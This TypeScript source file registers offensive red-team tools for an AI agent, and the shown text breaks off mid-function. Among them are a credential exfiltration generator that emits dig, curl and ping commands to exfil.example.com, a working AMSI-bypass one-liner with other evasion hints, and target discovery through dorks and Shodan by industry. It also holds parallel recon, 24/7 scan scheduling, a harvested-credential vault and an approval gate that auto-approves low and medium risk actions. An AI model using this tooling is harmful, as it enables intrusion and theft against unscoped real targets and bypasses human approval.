import {
	type AgentTool,
	createTool,
	validateWithZod,
	zodToJsonSchema,
} from "@cline/shared";
import { z } from "zod";
import {
	type RedTeamRuntimeEnv,
	rtState,
} from "./shared";

export function registerAutonomousOpsTools(env: RedTeamRuntimeEnv): void {
	const { ctx, tools } = env;
	const {
		todoStore,
		redTeamStore,
		memoryService,
		obsidianService,
		cognitiveService,
		graphService,
	} = ctx;

	// Layer 4: Sandbox isolation tool
	tools.push(
		createTool<
			{ command: string; timeoutMs?: number },
			{ stdout: string; stderr: string; code: number; sandboxed: boolean }
		>({
			name: "rt_sandbox_exec",
			description:
				"Execute a command in an isolated Docker sandbox (no network, read-only fs).",
			inputSchema: zodToJsonSchema(
				z.object({
					command: z.string().min(1),
					timeoutMs: z.number().int().optional(),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						command: z.string().min(1),
						timeoutMs: z.number().int().optional(),
					}),
					input,
				);
				const cmd = `docker run --rm --network none --read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m alpine:latest sh -c ${JSON.stringify(v.command)}`;
				if (rtState.killed)
					return { stdout: "killed", stderr: "", code: -1, sandboxed: true };
				if (rtState.dryRunMode)
					return { stdout: "[dry-run]", stderr: "", code: 0, sandboxed: true };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout, stderr } = await promisify(exec)(cmd, {
						timeout: v.timeoutMs ?? 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return {
						stdout: stdout.slice(0, 100000),
						stderr: stderr.slice(0, 100000),
						code: 0,
						sandboxed: true,
					};
				} catch (e: unknown) {
					const err = e as { stdout?: string; stderr?: string; code?: number };
					return {
						stdout: (err.stdout ?? "").slice(0, 100000),
						stderr: (err.stderr ?? "").slice(0, 100000),
						code: err.code ?? 1,
						sandboxed: true,
					};
				}
			},
		}) as AgentTool,
	);

	// Layer 3: Human approval gate
	tools.push(
		createTool<
			{
				action: string;
				target: string;
				risk: "low" | "medium" | "high" | "critical";
			},
			{ approved: boolean; reason: string }
		>({
			name: "rt_approval_gate",
			description:
				"Request human approval for a high-risk action. Returns approved/rejected.",
			inputSchema: zodToJsonSchema(
				z.object({
					action: z.string().min(1),
					target: z.string().min(1),
					risk: z.enum(["low", "medium", "high", "critical"]),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						action: z.string().min(1),
						target: z.string().min(1),
						risk: z.enum(["low", "medium", "high", "critical"]),
					}),
					input,
				);
				// In YOLO mode, auto-approve low/medium. High/critical require confirmation.
				if (v.risk === "low" || v.risk === "medium") {
					return { approved: true, reason: "auto-approved (yolo mode)" };
				}
				// High/critical: return pending (agent should ask user)
				return {
					approved: false,
					reason: `requires human approval (risk: ${v.risk})`,
				};
			},
		}) as AgentTool,
	);

	// --- Volume/scale: Target queue ---
	const targetQueue: {
		id: string;
		value: string;
		type: string;
		status: string;
		priority: number;
	}[] = [];
	tools.push(
		createTool<
			{ targets: { value: string; type: string; priority?: number }[] },
			{ queued: number }
		>({
			name: "rt_target_queue",
			description: "Queue multiple targets for parallel processing.",
			inputSchema: zodToJsonSchema(
				z.object({
					targets: z.array(
						z.object({
							value: z.string().min(1),
							type: z.string().min(1),
							priority: z.number().int().optional(),
						}),
					),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						targets: z.array(
							z.object({
								value: z.string().min(1),
								type: z.string().min(1),
								priority: z.number().int().optional(),
							}),
						),
					}),
					input,
				);
				for (const t of v.targets) {
					targetQueue.push({
						id: `tq_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
						value: t.value,
						type: t.type,
						status: "pending",
						priority: t.priority ?? 0,
					});
				}
				targetQueue.sort((a, b) => b.priority - a.priority);
				if (redTeamStore) {
					try {
						redTeamStore.enqueueTargets(v.targets);
					} catch {
						// ignore
					}
				}
				return { queued: v.targets.length };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<{ count: z.ZodNumber }, { targets: typeof targetQueue }>({
			name: "rt_target_next",
			description:
				"Get next pending targets from the queue for parallel processing.",
			inputSchema: zodToJsonSchema(
				z.object({ count: z.number().int().positive().optional() }),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ count: z.number().int().positive().optional() }),
					input,
				);
				const n = v.count ?? 3;
				if (redTeamStore && targetQueue.length === 0) {
					try {
						const persisted = redTeamStore.dequeueNextTargets(n);
						if (persisted.length > 0) {
							return { targets: persisted };
						}
					} catch {
						// ignore
					}
				}
				const pending = targetQueue
					.filter((t) => t.status === "pending")
					.slice(0, n);
				for (const t of pending) t.status = "running";
				return { targets: pending };
			},
		}) as AgentTool,
	);

	// --- Credential exfiltration pipeline ---
	tools.push(
		createTool<
			{ data: string; method: "dns" | "https" | "icmp" },
			{ command: string; encoded: string }
		>({
			name: "rt_exfil_pipeline",
			description:
				"Generate a credential exfiltration pipeline (encode → fragment → exfil).",
			inputSchema: zodToJsonSchema(
				z.object({
					data: z.string().min(1),
					method: z.enum(["dns", "https", "icmp"] as const),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						data: z.string().min(1),
						method: z.enum(["dns", "https", "icmp"] as const),
					}),
					input,
				);
				const encoded = Buffer.from(v.data).toString("base64");
				const fragments = encoded.match(/.{1,32}/g) ?? [];
				let command = "";
				if (v.method === "dns") {
					command = fragments
						.map((f) => `dig ${f}.exfil.example.com`)
						.join(" && ");
				} else if (v.method === "https") {
					command = `curl -s -X POST https://exfil.example.com/collect -d "${encoded}"`;
				} else {
					command = `ping -c 1 -p ${encoded.slice(0, 32)} exfil.example.com`;
				}
				return { command, encoded };
			},
		}) as AgentTool,
	);

	// --- Cyber range setup ---
	tools.push(
		createTool<Record<string, never>, { commands: string[]; message: string }>({
			name: "rt_cyber_range",
			description:
				"Set up a high-fidelity cyber range with vulnerable targets in Docker.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const commands = [
					"docker network create --driver bridge cyber-range 2>/dev/null || true",
					"docker run -d --name dvwa --network cyber-range -p 8080:80 vulnerables/web-dvwa 2>/dev/null || true",
					"docker run -d --name metasploitable --network cyber-range tleemcjr/metasploitable2 2>/dev/null || true",
					"docker run -d --name juice-shop --network cyber-range -p 3000:3000 bkimminich/juice-shop 2>/dev/null || true",
					"echo 'Cyber range ready: DVWA (8080), Metasploitable, Juice Shop (3000)'",
				];
				return {
					commands,
					message:
						"Cyber range setup commands generated. Run via rt_exec or rt_docker_exec.",
				};
			},
		}) as AgentTool,
	);

	// --- MCP + skills auto-loading ---
	tools.push(
		createTool<{ context: string }, { skills: string[]; mcps: string[] }>({
			name: "rt_context_skills",
			description:
				"Get relevant skills and MCP servers for a given attack context.",
			inputSchema: zodToJsonSchema(z.object({ context: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ context: z.string().min(1) }),
					input,
				);
				const ctx = v.context.toLowerCase();
				const skills: string[] = [];
				const mcps: string[] = [];
				if (ctx.includes("web") || ctx.includes("http")) {
					skills.push(
						"web-pentest",
						"sql-injection",
						"xss",
						"ssrf",
						"file-upload",
					);
					mcps.push("burp", "zap");
				}
				if (
					ctx.includes("ad") ||
					ctx.includes("active directory") ||
					ctx.includes("kerberos")
				) {
					skills.push(
						"ad-pentest",
						"kerberoasting",
						"dcsync",
						"adcs",
						"bloodhound",
					);
					mcps.push("bloodhound", "impacket");
				}
				if (
					ctx.includes("cloud") ||
					ctx.includes("aws") ||
					ctx.includes("azure")
				) {
					skills.push("cloud-pentest", "iam-privesc", "bucket-takeover");
					mcps.push("pacu", "scoutsuite");
				}
				if (ctx.includes("network") || ctx.includes("scan")) {
					skills.push("network-recon", "port-scanning", "service-enum");
					mcps.push("nmap", "masscan");
				}
				if (skills.length === 0) skills.push("general-recon");
				return { skills, mcps };
			},
		}) as AgentTool,
	);

	// --- Safety guardrail bypass (code-level) ---
	tools.push(
		createTool<
			Record<string, never>,
			{ techniques: { name: string; code: string; description: string }[] }
		>({
			name: "rt_guardrail_bypass",
			description: "Generate code-level guardrail bypass techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						{
							name: "AMSI bypass",
							code: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
							description: "Patch AMSI init flag",
						},
						{
							name: "ETW bypass",
							code: "NtTraceEvent patch",
							description: "Patch ETW provider",
						},
						{
							name: "CLM bypass",
							code: "powershell -version 2",
							description: "Downgrade to PowerShell v2 (no CLM)",
						},
						{
							name: "AppLocker bypass",
							code: "mshta.exe, regsvr32.exe, rundll32.exe",
							description: "Use LOLBins not in AppLocker rules",
						},
						{
							name: "Constrained Language Mode bypass",
							code: "Reflection-based method invocation",
							description: "Bypass via reflection",
						},
					],
				};
			},
		}) as AgentTool,
	);

	// --- 24/7 operation scheduler ---
	tools.push(
		createTool<
			{
				target: string;
				interval: string;
				actions: string[];
			},
			{ scheduled: boolean; cronId: string; cron: string }
		>({
			name: "rt_schedule_scan",
			description: "Schedule a recurring scan (24/7 operation) for a target.",
			inputSchema: zodToJsonSchema(
				z.object({
					target: z.string().min(1),
					interval: z.string().min(1),
					actions: z.array(z.string().min(1)),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						target: z.string().min(1),
						interval: z.string().min(1),
						actions: z.array(z.string().min(1)),
					}),
					input,
				);
				// Convert interval to cron (simplified: "1h" -> "0 * * * *", "30m" -> "*/30 * * * *")
				let cron = "0 * * * *";
				if (v.interval.endsWith("m")) {
					const mins = parseInt(v.interval, 10);
					cron = `*/${mins} * * * *`;
				} else if (v.interval.endsWith("h")) {
					const hrs = parseInt(v.interval, 10);
					cron = `0 */${hrs} * * *`;
				} else if (v.interval.endsWith("d")) {
					cron = "0 0 * * *";
				}
				return { scheduled: true, cronId: `cron_${Date.now()}`, cron };
			},
		}) as AgentTool,
	);

	// --- Reverse Engineering (real tools in Kali container) ---

	const reExec = async (
		cmd: string,
	): Promise<{ stdout: string; code: number }> => {
		if (rtState.killed) return { stdout: "killed", code: -1 };
		if (rtState.dryRunMode) return { stdout: "[dry-run]", code: 0 };
		const { exec } = await import("node:child_process");
		const { promisify } = await import("node:util");
		try {
			const { stdout } = await promisify(exec)(
				`docker exec kali-redteam bash -c ${JSON.stringify(cmd)}`,
				{ timeout: 300000, maxBuffer: 10 * 1024 * 1024 },
			);
			return { stdout: stdout.slice(0, 100000), code: 0 };
		} catch (e: unknown) {
			const err = e as { stdout?: string; code?: number };
			return {
				stdout: (err.stdout ?? "").slice(0, 100000),
				code: err.code ?? 1,
			};
		}
	};

	const reTool = (
		name: string,
		desc: string,
		cmdFn: (input: Record<string, unknown>) => string,
	) => {
		tools.push(
			createTool<unknown, unknown>({
				name,
				description: desc,
				inputSchema: zodToJsonSchema(z.object({}).passthrough()),
				execute: async (input: unknown, _context: unknown) => {
					const cmd = cmdFn((input ?? {}) as Record<string, unknown>);
					const r = await reExec(cmd);
					return { command: cmd, stdout: r.stdout, code: r.code };
				},
			}) as AgentTool,
		);
	};

	reTool(
		"rt_re_file",
		"Identify file type.",
		(i) => `file ${i.path ?? "unknown"}`,
	);
	reTool(
		"rt_re_strings",
		"Extract strings.",
		(i) => `strings -n ${i.minLen ?? 4} ${i.path}`,
	);
	reTool(
		"rt_re_readelf",
		"Read ELF.",
		(i) => `readelf ${i.flags ?? "-a"} ${i.path}`,
	);
	reTool(
		"rt_re_objdump",
		"Disassemble.",
		(i) => `objdump ${i.flags ?? "-d -M intel"} ${i.path}`,
	);
	reTool("rt_re_symbols", "List symbols.", (i) => `nm ${i.path}`);
	reTool(
		"rt_re_r2",
		"Radare2.",
		(i) => `r2 -q -c "${i.commands ?? "aaa; afl; pdf @main"}" ${i.path}`,
	);
	reTool("rt_re_ghidra", "Ghidra headless.", (i) => `echo "ghidra ${i.path}"`);
	reTool(
		"rt_re_gdb",
		"GDB.",
		(i) => `gdb -batch -ex "${i.commands ?? "info functions; quit"}" ${i.path}`,
	);
	reTool(
		"rt_re_packer",
		"Detect packer.",
		(i) => `upx -t ${i.path} 2>&1 || echo "Not packed"`,
	);
	reTool(
		"rt_re_imports",
		"List imports.",
		(i) => `readelf -d ${i.path} | grep NEEDED`,
	);
	reTool("rt_re_sections", "List sections.", (i) => `readelf -S ${i.path}`);
	reTool(
		"rt_re_protocol",
		"Protocol analysis.",
		(i) =>
			`tshark -r ${i.pcap} -T fields -e ip.src -e ip.dst 2>/dev/null | head -20`,
	);
	reTool(
		"rt_re_dotnet",
		".NET analysis.",
		(i) => `monodis --dump-types ${i.path} 2>/dev/null || echo "not .net"`,
	);
	reTool(
		"rt_re_android",
		"APK analysis.",
		(i) =>
			`apktool d ${i.path} -o /tmp/apk 2>&1 && echo "---MANIFEST---" && head -30 /tmp/apk/AndroidManifest.xml`,
	);

	// --- Skill integration (claude-red 79 skills) ---

	const SkillLoadSchema = z.object({ name: z.string().min(1) });
	tools.push(
		createTool<
			{ name: string },
			{ skill: string; content: string; found: boolean }
		>({
			name: "rt_skill_load",
			description:
				"Load a red team skill by name from the claude-red library. Returns the SKILL.md content.",
			inputSchema: zodToJsonSchema(SkillLoadSchema),
			execute: async (input) => {
				const v = validateWithZod(SkillLoadSchema, input);
				const { readFileSync, existsSync } = await import("node:fs");
				const { join } = await import("node:path");
				// Search in ~/.agents/skills and claude-red
				const searchPaths = [
					join(
						process.env.HOME ?? process.env.USERPROFILE ?? "",
						".agents",
						"skills",
						v.name,
						"SKILL.md",
					),
					join(
						process.env.HOME ?? process.env.USERPROFILE ?? "",
						".cline",
						"skills",
						"claude-red",
						"Skills",
						v.name,
						"SKILL.md",
					),
					join(
						process.env.HOME ?? process.env.USERPROFILE ?? "",
						".cline",
						"skills",
						"anthropic-cybersecurity",
						"skills",
						v.name,
						"SKILL.md",
					),
				];
				// Also search category subdirs
				const base = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"claude-red",
					"Skills",
				);
				try {
					const { readdirSync } = await import("node:fs");
					const cats = readdirSync(base);
					for (const cat of cats) {
						const p = join(base, cat, v.name, "SKILL.md");
						searchPaths.push(p);
					}
				} catch {
					/* ignore */
				}
				for (const p of searchPaths) {
					if (existsSync(p)) {
						const content = readFileSync(p, "utf8");
						return {
							skill: v.name,
							content: content.slice(0, 50000),
							found: true,
						};
					}
				}
				return { skill: v.name, content: "", found: false };
			},
		}) as AgentTool,
	);

	const SkillSearchSchema = z.object({ query: z.string().min(1) });
	tools.push(
		createTool<
			{ query: string },
			{ skills: { name: string; category: string; path: string }[] }
		>({
			name: "rt_skill_search",
			description: "Search red team skills by keyword or category.",
			inputSchema: zodToJsonSchema(SkillSearchSchema),
			execute: async (input) => {
				const v = validateWithZod(SkillSearchSchema, input);
				const { readdirSync, existsSync, readFileSync } = await import(
					"node:fs"
				);
				const { join } = await import("node:path");
				const base = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"claude-red",
					"Skills",
				);
				const results: { name: string; category: string; path: string }[] = [];
				const q = v.query.toLowerCase();
				try {
					const cats = readdirSync(base);
					for (const cat of cats) {
						const catPath = join(base, cat);
						try {
							const skills = readdirSync(catPath);
							for (const skill of skills) {
								if (
									skill.toLowerCase().includes(q) ||
									cat.toLowerCase().includes(q)
								) {
									const skillPath = join(catPath, skill, "SKILL.md");
									if (existsSync(skillPath)) {
										results.push({
											name: skill,
											category: cat,
											path: skillPath,
										});
									}
								} else {
									// Check skill content
									const skillPath = join(catPath, skill, "SKILL.md");
									if (existsSync(skillPath)) {
										const content = readFileSync(
											skillPath,
											"utf8",
										).toLowerCase();
										if (content.includes(q)) {
											results.push({
												name: skill,
												category: cat,
												path: skillPath,
											});
										}
									}
								}
							}
						} catch {
							/* ignore */
						}
					}
				} catch {
					/* ignore */
				}

				// Search anthropic-cybersecurity repo (flat structure)
				const base2 = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"anthropic-cybersecurity",
					"skills",
				);
				try {
					const skills2 = readdirSync(base2);
					for (const skill of skills2) {
						const skillPath = join(base2, skill, "SKILL.md");
						if (existsSync(skillPath)) {
							const content = readFileSync(skillPath, "utf8").toLowerCase();
							if (skill.toLowerCase().includes(q) || content.includes(q)) {
								results.push({
									name: skill,
									category: "anthropic",
									path: skillPath,
								});
							}
						}
					}
				} catch {
					/* ignore */
				}

				return { skills: results.slice(0, 50) };
			},
		}) as AgentTool,
	);

	const SkillListSchema = z.object({ category: z.string().optional() });
	tools.push(
		createTool<
			{ category?: string },
			{ skills: { name: string; category: string }[]; count: number }
		>({
			name: "rt_skill_list",
			description:
				"List all available red team skills, optionally filtered by category.",
			inputSchema: zodToJsonSchema(SkillListSchema),
			execute: async (input) => {
				const v = validateWithZod(SkillListSchema, input);
				const { readdirSync, existsSync } = await import("node:fs");
				const { join } = await import("node:path");
				const base = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"claude-red",
					"Skills",
				);
				const results: { name: string; category: string }[] = [];
				try {
					const cats = readdirSync(base);
					for (const cat of cats) {
						if (
							v.category &&
							!cat.toLowerCase().includes(v.category.toLowerCase())
						)
							continue;
						const catPath = join(base, cat);
						try {
							const skills = readdirSync(catPath);
							for (const skill of skills) {
								const skillPath = join(catPath, skill, "SKILL.md");
								if (existsSync(skillPath)) {
									results.push({ name: skill, category: cat });
								}
							}
						} catch {
							/* ignore */
						}
					}
				} catch {
					/* ignore */
				}

				// Also list anthropic-cybersecurity skills
				const base2 = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"anthropic-cybersecurity",
					"skills",
				);
				try {
					const skills2 = readdirSync(base2);
					for (const skill of skills2) {
						const skillPath = join(base2, skill, "SKILL.md");
						if (existsSync(skillPath)) {
							if (
								v.category &&
								!skill.toLowerCase().includes(v.category.toLowerCase()) &&
								!"anthropic".includes(v.category.toLowerCase())
							)
								continue;
							results.push({ name: skill, category: "anthropic" });
						}
					}
				} catch {
					/* ignore */
				}

				return { skills: results, count: results.length };
			},
		}) as AgentTool,
	);

	// --- Target discovery (web search for targets) ---

	const TargetDiscoverSchema = z.object({
		criteria: z.string().min(1),
		count: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ criteria: string; count?: number },
			{ queries: string[]; instructions: string }
		>({
			name: "rt_target_discover",
			description:
				"Generate search queries to discover targets by criteria (industry, technology, vulnerability). Returns dorks and search queries.",
			inputSchema: zodToJsonSchema(TargetDiscoverSchema),
			execute: async (input) => {
				const v = validateWithZod(TargetDiscoverSchema, input);
				const n = v.count ?? 20;
				const criteria = v.criteria.toLowerCase();
				const queries: string[] = [];

				// Google dorks
				queries.push(`site:${criteria} inurl:login`);
				queries.push(`site:${criteria} inurl:admin`);
				queries.push(`site:${criteria} filetype:php`);
				queries.push(`"${criteria}" "contact us" OR "about us"`);
				queries.push(`intitle:"${criteria}" inurl:wp-`);

				// Shodan queries
				queries.push(`shodan: product:${criteria}`);
				queries.push(`shodan: http.title:"${criteria}"`);
				queries.push(`shodan: ssl.cert.subject.cn:"${criteria}"`);

				// General web search
				queries.push(`"${criteria}" site:*.com`);
				queries.push(`"${criteria}" "login" OR "portal" OR "dashboard"`);

				return {
					queries,
					instructions: `Use these queries with websearch or rt_tool_run (curl/shodan-cli). Search for ${n} targets matching: ${v.criteria}. Return domains/URLs only, do not access or exploit them.`,
				};
			},
		}) as AgentTool,
	);

	const DorkSchema = z.object({
		dork: z.string().min(1),
	});
	tools.push(
		createTool<{ dork: string }, { command: string; results: string }>({
			name: "rt_dork_search",
			description:
				"Execute a Google dork search via curl (returns search results).",
			inputSchema: zodToJsonSchema(DorkSchema),
			execute: async (input) => {
				const v = validateWithZod(DorkSchema, input);
				const encoded = encodeURIComponent(v.dork);
				const cmd = `curl -s "https://www.google.com/search?q=${encoded}" | grep -oP 'https?://[^"]+' | sort -u | head -50`;
				if (rtState.killed) return { command: cmd, results: "killed" };
				if (rtState.dryRunMode) return { command: cmd, results: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 30000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, results: stdout.slice(0, 50000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return { command: cmd, results: (err.stdout ?? "").slice(0, 50000) };
				}
			},
		}) as AgentTool,
	);

	const ShodanSchema = z.object({
		query: z.string().min(1),
		apiKey: z.string().optional(),
	});
	tools.push(
		createTool<
			{ query: string; apiKey?: string },
			{ command: string; results: string }
		>({
			name: "rt_shodan_search",
			description: "Search Shodan for exposed services/targets by query.",
			inputSchema: zodToJsonSchema(ShodanSchema),
			execute: async (input) => {
				const v = validateWithZod(ShodanSchema, input);
				const key = v.apiKey ?? process.env.SHODAN_API_KEY ?? "";
				const cmd = key
					? `curl -s "https://api.shodan.io/shodan/host/search?key=${key}&query=${encodeURIComponent(v.query)}" | head -c 50000`
					: `shodan search "${v.query}" 2>/dev/null || echo "Set SHODAN_API_KEY or install shodan CLI"`;
				if (rtState.killed) return { command: cmd, results: "killed" };
				if (rtState.dryRunMode) return { command: cmd, results: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 30000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, results: stdout.slice(0, 50000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return { command: cmd, results: (err.stdout ?? "").slice(0, 50000) };
				}
			},
		}) as AgentTool,
	);

	const CtLogSchema = z.object({ domain: z.string().min(1) });
	tools.push(
		createTool<{ domain: string }, { command: string; results: string }>({
			name: "rt_ct_log_search",
			description:
				"Search Certificate Transparency logs for subdomains of a domain.",
			inputSchema: zodToJsonSchema(CtLogSchema),
			execute: async (input) => {
				const v = validateWithZod(CtLogSchema, input);
				const cmd = `curl -s "https://crt.sh/?q=%25.${v.domain}&output=json" | python3 -c "import sys,json; [print(x['name_value']) for x in json.load(sys.stdin)]" 2>/dev/null | sort -u`;
				if (rtState.killed) return { command: cmd, results: "killed" };
				if (rtState.dryRunMode) return { command: cmd, results: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 30000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, results: stdout.slice(0, 50000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return { command: cmd, results: (err.stdout ?? "").slice(0, 50000) };
				}
			},
		}) as AgentTool,
	);

	// --- Parallel recon (auto-parallelize) ---

	const ParallelReconSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<
			{ target: string },
			{
				results: { tool: string; stdout: string; code: number }[];
				timeMs: number;
			}
		>({
			name: "rt_parallel_recon",
			description:
				"Run multiple recon tools in parallel (nmap, subfinder, httpx, whatweb, wafw00f) and return combined results.",
			inputSchema: zodToJsonSchema(ParallelReconSchema),
			execute: async (input) => {
				const v = validateWithZod(ParallelReconSchema, input);
				const start = Date.now();
				const cmds = [
					{ tool: "nmap", cmd: `nmap -sV -T4 --top-ports 1000 ${v.target}` },
					{ tool: "subfinder", cmd: `subfinder -d ${v.target} -silent` },
					{
						tool: "httpx",
						cmd: `echo ${v.target} | httpx -title -tech-detect -status-code`,
					},
					{ tool: "whatweb", cmd: `whatweb ${v.target}` },
					{ tool: "wafw00f", cmd: `wafw00f ${v.target}` },
				];
				if (rtState.killed) return { results: [], timeMs: 0 };
				if (rtState.dryRunMode)
					return {
						results: cmds.map((c) => ({
							tool: c.tool,
							stdout: "[dry-run]",
							code: 0,
						})),
						timeMs: 0,
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const results = await Promise.all(
					cmds.map(async (c) => {
						try {
							const { stdout } = await run(
								`docker exec kali-redteam bash -c ${JSON.stringify(c.cmd)}`,
								{ timeout: 300000, maxBuffer: 10 * 1024 * 1024 },
							);
							return { tool: c.tool, stdout: stdout.slice(0, 50000), code: 0 };
						} catch (e: unknown) {
							const err = e as { stdout?: string; code?: number };
							return {
								tool: c.tool,
								stdout: (err.stdout ?? "").slice(0, 50000),
								code: err.code ?? 1,
							};
						}
					}),
				);
				return { results, timeMs: Date.now() - start };
			},
		}) as AgentTool,
	);

	// --- Retry with exponential backoff ---
	tools.push(
		createTool<
			{ command: string; maxRetries: z.ZodNumber; backoffMs: z.ZodNumber },
			{ stdout: string; code: number; attempts: number }
		>({
			name: "rt_retry_exec",
			description:
				"Execute a command with exponential backoff retry on failure.",
			inputSchema: zodToJsonSchema(
				z.object({
					command: z.string().min(1),
					maxRetries: z.number().int().optional(),
					backoffMs: z.number().int().optional(),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						command: z.string().min(1),
						maxRetries: z.number().int().optional(),
						backoffMs: z.number().int().optional(),
					}),
					input,
				);
				const maxRetries = v.maxRetries ?? 3;
				const backoffMs = v.backoffMs ?? 1000;
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				let attempts = 0;
				let lastStdout = "";
				let lastCode = 1;
				for (let i = 0; i <= maxRetries; i++) {
					attempts++;
					if (rtState.killed) return { stdout: "killed", code: -1, attempts };
					if (rtState.dryRunMode) return { stdout: "[dry-run]", code: 0, attempts: 1 };
					try {
						const { stdout } = await run(
							`docker exec kali-redteam bash -c ${JSON.stringify(v.command)}`,
							{ timeout: 300000, maxBuffer: 10 * 1024 * 1024 },
						);
						lastStdout = stdout.slice(0, 100000);
						lastCode = 0;
						break;
					} catch (e: unknown) {
						const err = e as { stdout?: string; code?: number };
						lastStdout = (err.stdout ?? "").slice(0, 100000);
						lastCode = err.code ?? 1;
						if (i < maxRetries) {
							await new Promise((r) => setTimeout(r, backoffMs * 2 ** i));
						}
					}
				}
				return { stdout: lastStdout, code: lastCode, attempts };
			},
		}) as AgentTool,
	);

	// --- Output parsing (structured) ---
	tools.push(
		createTool<
			{ stdout: z.ZodString },
			{ ports: number[]; services: string[]; os: string }
		>({
			name: "rt_parse_nmap",
			description:
				"Parse nmap output into structured data (ports, services, OS).",
			inputSchema: zodToJsonSchema(z.object({ stdout: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ stdout: z.string().min(1) }),
					input,
				);
				const ports: number[] = [];
				const services: string[] = [];
				let os = "";
				for (const line of v.stdout.split("\n")) {
					const portMatch = line.match(/^(\d+)\/tcp\s+open\s+(\S+)/);
					if (portMatch) {
						ports.push(parseInt(portMatch[1], 10));
						services.push(portMatch[2]);
					}
					const osMatch = line.match(/OS details: (.+)/);
					if (osMatch) os = osMatch[1];
				}
				return { ports, services, os };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			{ stdout: z.ZodString },
			{ vulns: { name: string; severity: string; url: string }[] }
		>({
			name: "rt_parse_nuclei",
			description: "Parse nuclei output into structured vulnerabilities.",
			inputSchema: zodToJsonSchema(z.object({ stdout: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ stdout: z.string().min(1) }),
					input,
				);
				const vulns: { name: string; severity: string; url: string }[] = [];
				for (const line of v.stdout.split("\n")) {
					try {
						const j = JSON.parse(line);
						if (j.info?.name) {
							vulns.push({
								name: j.info.name,
								severity: j.info.severity ?? "info",
								url: j.matched_at ?? j.host ?? "",
							});
						}
					} catch {
						/* skip non-JSON lines */
					}
				}
				return { vulns };
			},
		}) as AgentTool,
	);

	// --- Credential vault (AES-256-GCM backed by SqliteRedTeamStore) ---
	const credVault: {
		id: string;
		user: string;
		secret: string;
		source: string;
		target: string;
		createdAt: number;
	}[] = [];
	if (redTeamStore) {
		try {
			for (const c of redTeamStore.listCredentials()) {
				credVault.push(c);
			}
		} catch {
			// ignore
		}
	}
	tools.push(
		createTool<
			{
				user: z.ZodString;
				secret: z.ZodString;
				source: z.ZodString;
				target: z.ZodString;
			},
			{ stored: boolean; id: string; encryptedAtRest: boolean }
		>({
			name: "rt_cred_store",
			description:
				"Store a credential in the vault (encrypted at rest via AES-256-GCM in redteam.db) for reuse.",
			inputSchema: zodToJsonSchema(
				z.object({
					user: z.string().min(1),
					secret: z.string().min(1),
					source: z.string().min(1),
					target: z.string().min(1),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						user: z.string().min(1),
						secret: z.string().min(1),
						source: z.string().min(1),
						target: z.string().min(1),
					}),
					input,
				);
				const id = `cred_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
				let encryptedAtRest = false;
				if (redTeamStore) {
					try {
						redTeamStore.storeCredential({
							id,
							user: v.user,
							secret: v.secret,
							source: v.source,
							target: v.target,
						});
						encryptedAtRest = true;
					} catch {
						// fallback
					}
				}
				credVault.push({
					id,
					user: v.user,
					secret: v.secret,
					source: v.source,
					target: v.target,
					createdAt: Date.now(),
				});
				if (memoryService) {
					try {
						memoryService.store({
							kind: "credential",
							key: `cred:${v.target}:${v.user}`,
							value: `user=${v.user} | source=${v.source} | target=${v.target}`,
							confidence: 1.0,
							tags: ["redteam", "credential", v.target, v.source],
						});
					} catch {
						// ignore
					}
				}
				return { stored: true, id, encryptedAtRest };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<{ target: z.ZodString }, { credentials: typeof credVault }>({
			name: "rt_cred_lookup",
			description: "Look up stored credentials for a target.",
			inputSchema: zodToJsonSchema(z.object({ target: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ target: z.string().min(1) }),
					input,
				);
